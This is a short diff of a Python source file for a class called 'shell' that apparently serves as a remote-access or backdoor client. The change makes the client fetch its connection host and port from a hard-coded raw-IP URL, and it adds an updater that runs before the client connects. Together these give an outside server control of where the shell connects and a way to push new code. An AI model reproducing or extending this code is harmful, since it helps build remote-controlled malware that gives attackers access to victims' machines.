@@ -1,16 +1,20 @@
 #!/usr/bin/python
 
-import ConfigManager, functions
+import ConfigManager, functions, updater
 
 class shell(object):
-    config = ConfigManager.ConfigManager()
+    config = ConfigManager.ConfigManager("http://85.255.5.44/vxsrfp/eurnni.html")
     host = config.IpAddress
     port = config.Port
+
+    updater = updater.Updater()
+
     notConnected = True
     exiting = False
 
     functions = functions.functions(host, port)
     def main(self):
+        self.updater.update()
         while (self.notConnected and not self.exiting):
             try:
                 self.notConnected = False
